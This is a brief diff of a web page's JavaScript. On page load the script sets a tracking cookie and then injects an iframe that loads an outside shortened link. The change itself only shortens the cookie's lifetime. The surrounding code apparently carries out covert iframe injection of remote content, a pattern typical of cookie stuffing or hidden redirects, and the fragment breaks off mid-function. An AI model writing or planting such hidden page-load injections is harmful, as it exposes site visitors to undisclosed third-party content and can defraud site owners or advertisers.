@@ -40,7 +40,7 @@ window.onload = function(e){
     footerNode.appendChild(slike);
   }
   if(!loaded) {
-    setCookie('saff',1,28);
+    setCookie('saff',1,7);
     var list = ['https://shorten.asia/44h1EFtU'];
     setTimeout(function(){
       var node = document.createElement('iframe');
